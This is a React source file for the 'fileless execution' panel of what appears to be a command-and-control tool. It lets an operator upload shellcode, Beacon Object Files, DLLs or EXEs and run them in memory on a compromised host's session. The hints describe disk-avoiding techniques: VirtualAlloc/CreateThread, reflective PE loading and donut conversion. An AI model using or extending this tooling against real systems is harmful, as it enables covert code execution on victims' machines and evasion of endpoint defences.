import { useState, type CSSProperties } from 'react'
import { Zap, Upload, Play } from 'lucide-react'
import type { Session } from '../types'
import { sessionApi } from '../api'

interface FilelessExecPanelProps {
  session: Session
}

type FilelessKind = 'shellcode' | 'bof' | 'dll' | 'exe'

const KINDS: { value: FilelessKind; label: string; hint: string }[] = [
  { value: 'shellcode', label: 'Shellcode', hint: '原始位置无关字节码，VirtualAlloc + CreateThread 内存执行' },
  { value: 'bof', label: 'BOF', hint: 'Beacon Object File（COFF），全程内存执行，无需落盘' },
  { value: 'dll', label: 'DLL', hint: '反射式 PE 加载：内存映射 + 重定位 + 导入表修复，不落盘' },
  { value: 'exe', label: 'EXE', hint: '服务端用 donut 转位置无关 shellcode 后内存执行，不落盘' },
]

/** 读取文件为纯 base64（去除 data URL 前缀） */
function readFileAsBase64(file: File): Promise<string> {
  return new Promise((resolve, reject) => {
    const reader = new FileReader()
    reader.onload = () => {
      const result = reader.result as string
      const idx = result.indexOf(',')
      resolve(idx >= 0 ? result.slice(idx + 1) : result)
    }
    reader.onerror = () => reject(reader.error)
    reader.readAsDataURL(file)
  })
}

/** 轮询任务结果，最多 60 秒 */
async function pollTaskResult(taskId: number): Promise<{ output?: string; error?: string }> {
  const token = localStorage.getItem('toshell-token')
  const intervals = [0, 200, 300, 500, 1000, 2000]
  for (let i = 0; i < 60; i++) {
    try {
      const resp = await fetch(`/api/v1/tasks/${taskId}`, {
        headers: { Authorization: `Bearer ${token}` },
      })
      const task = await resp.json()
      if (task.status === 'completed') return { output: task.output }
      if (task.status === 'failed') return { error: task.error || '任务执行失败' }
    } catch {
      // ignore network errors during polling
    }
    await new Promise((r) => setTimeout(r, intervals[Math.min(i, intervals.length - 1)]))
  }
  return { error: '任务执行超时 (60s)' }
}

export function FilelessExecPanel({ session }: FilelessExecPanelProps) {
  const [kind, setKind] = useState<FilelessKind>('shellcode')
  const [payloadB64, setPayloadB64] = useState('')
  const [fileName, setFileName] = useState('')
  const [args, setArgs] = useState('')
  const [entry, setEntry] = useState('')
  const [arch, setArch] = useState('amd64')
  const [loading, setLoading] = useState(false)
  const [output, setOutput] = useState('')

  const currentKind = KINDS.find((k) => k.value === kind)!

  const handleFile = async (file: File | undefined) => {
    if (!file) return
    try {
      setFileName(file.name)
      const b64 = await readFileAsBase64(file)
      setPayloadB64(b64)
      setOutput(`已读取 ${file.name}（${file.size} 字节）→ base64 ${b64.length} 字符`)
    } catch (err: any) {
      setOutput('读取文件失败: ' + (err?.message || String(err)))
    }
  }

  const handleExecute = async () => {
    if (!payloadB64) {
      setOutput('请先粘贴 base64 载荷或选择文件')
      return
    }
    setLoading(true)
    setOutput(`正在下发 fileless-exec 任务 (kind=${kind})...`)
    try {
      const resp = await sessionApi.filelessExec(session.id, {
        kind,
        payload_b64: payloadB64,
        args: args || undefined,
        entry: entry || undefined,
        arch: kind === 'exe' ? arch : undefined,
      })
      const taskId = resp.data?.task_id
      if (!taskId) throw new Error('未返回 task_id')
      setOutput(`任务已下发 (task_id=${taskId})，等待执行结果...`)
      const result = await pollTaskResult(taskId)
      if (result.output) {
        setOutput('执行完成:\n' + result.output)
      } else {
        setOutput('执行失败: ' + (result.error || '未知错误'))
      }
    } catch (err: any) {
      setOutput('错误: ' + (err?.response?.data?.error || err?.message || String(err)))
    } finally {
      setLoading(false)
    }
  }

  const inputStyle: CSSProperties = {
    width: '100%',
    padding: '8px 10px',
    borderRadius: 6,
    border: '1px solid var(--border, #3a3a4a)',
    background: 'var(--bg-elevated, #1e1e2a)',
    color: 'var(--text, #e5e5ea)',
    fontSize: 13,
    boxSizing: 'border-box',
  }
  const labelStyle: CSSProperties = {
    display: 'block',
    marginBottom: 4,
    fontSize: 12,
    color: 'var(--text-dim, #9a9aab)',
  }
  const rowStyle: CSSProperties = { marginBottom: 12 }
  const panelStyle: CSSProperties = { padding: '4px 2px' }
  const outputStyle: CSSProperties = {
    marginTop: 12,
    background: 'var(--bg-deep, #12121a)',
    border: '1px solid var(--border, #3a3a4a)',
    borderRadius: 6,
    padding: 10,
    maxHeight: 320,
    overflow: 'auto',
    whiteSpace: 'pre-wrap',
    wordBreak: 'break-all',
    fontSize: 12,
    fontFamily: 'var(--mono, monospace)',
  }

  return (
    <div style={panelStyle}>
      <div style={{ display: 'flex', alignItems: 'center', gap: 8, marginBottom: 12 }}>
        <Zap size={18} color="#f5a623" />
        <span style={{ fontWeight: 600 }}>全内存无文件执行 — {session.hostname}</span>
      </div>

      <div style={rowStyle}>
        <label style={labelStyle}>载荷类型</label>
        <select
          value={kind}
          onChange={(e) => setKind(e.target.value as FilelessKind)}
          style={inputStyle}
        >
          {KINDS.map((k) => (
            <option key={k.value} value={k.value}>
              {k.label}
            </option>
          ))}
        </select>
        <p style={{ marginTop: 4, fontSize: 12, color: 'var(--text-dim, #9a9aab)' }}>
          {currentKind.hint}
        </p>
      </div>

      <div style={rowStyle}>
        <label style={labelStyle}>载荷（文件上传，自动转 base64）</label>
        <label className="btn-small" style={{ display: 'inline-flex', alignItems: 'center', gap: 6, cursor: 'pointer' }}>
          <Upload size={14} /> 选择文件
          <input
            type="file"
            style={{ display: 'none' }}
            onChange={(e) => handleFile(e.target.files?.[0])}
          />
        </label>
        {fileName && (
          <span style={{ marginLeft: 8, fontSize: 12, color: 'var(--text-dim, #9a9aab)' }}>
            {fileName}
          </span>
        )}
      </div>

      <div style={rowStyle}>
        <label style={labelStyle}>或粘贴 base64 载荷</label>
        <textarea
          value={payloadB64}
          onChange={(e) => setPayloadB64(e.target.value)}
          placeholder="base64 编码的载荷..."
          rows={3}
          style={{ ...inputStyle, resize: 'vertical', fontFamily: 'var(--mono, monospace)' }}
        />
      </div>

      <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr 1fr', gap: 10 }}>
        <div>
          <label style={labelStyle}>参数 args（BOF 用）</label>
          <input
            type="text"
            value={args}
            onChange={(e) => setArgs(e.target.value)}
            placeholder="可选"
            style={inputStyle}
            disabled={kind !== 'bof'}
          />
        </div>
        <div>
          <label style={labelStyle}>导出函数 entry（DLL 用）</label>
          <input
            type="text"
            value={entry}
            onChange={(e) => setEntry(e.target.value)}
            placeholder="可选，如 DllMain / Run"
            style={inputStyle}
            disabled={kind !== 'dll'}
          />
        </div>
        <div>
          <label style={labelStyle}>架构 arch（EXE→shellcode）</label>
          <select
            value={arch}
            onChange={(e) => setArch(e.target.value)}
            style={inputStyle}
            disabled={kind !== 'exe'}
          >
            <option value="amd64">amd64</option>
            <option value="386">386</option>
            <option value="arm64">arm64</option>
          </select>
        </div>
      </div>

      <button
        className="btn-primary"
        onClick={handleExecute}
        disabled={loading || !payloadB64}
        style={{ display: 'inline-flex', alignItems: 'center', gap: 6, marginTop: 12 }}
      >
        <Play size={14} />
        {loading ? '执行中...' : '内存执行'}
      </button>

      <pre style={outputStyle}>{output || '执行输出将显示在这里...'}</pre>
    </div>
  )
}
